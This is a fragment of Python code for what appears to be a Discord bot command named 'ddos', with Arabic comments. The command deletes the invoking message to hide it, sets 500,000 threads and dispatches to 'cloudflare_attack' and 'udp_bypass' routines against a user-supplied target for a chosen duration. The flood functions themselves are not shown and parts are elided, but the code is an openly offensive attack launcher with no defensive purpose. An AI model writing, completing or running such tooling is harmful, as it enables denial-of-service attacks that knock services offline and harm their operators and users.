...
@bot.command()
async def ddos(ctx, method: str, target: str, duration: int = 60):
    await ctx.message.delete()
    method = method.upper()
    threads = 500000  # عدد الخيوط الافتراضي

    try:
        # طباعة تفاصيل الهجوم في الكونسول
        print(f"[+] DDoS Command Executed by: {ctx.author} | Method: {method} | Target: {target} | Duration: {duration}s | Threads: {threads}")

        if method == "CLOUDFLARE":
            cloudflare_attack(target, threads, duration)
        elif method == "UDP-BYPASS":
            ip, port = target.split(":")
            udp_bypass(ip, int(port), threads, duration)
        ...
        print(f"[!] Error occurred during attack execution: {e}")
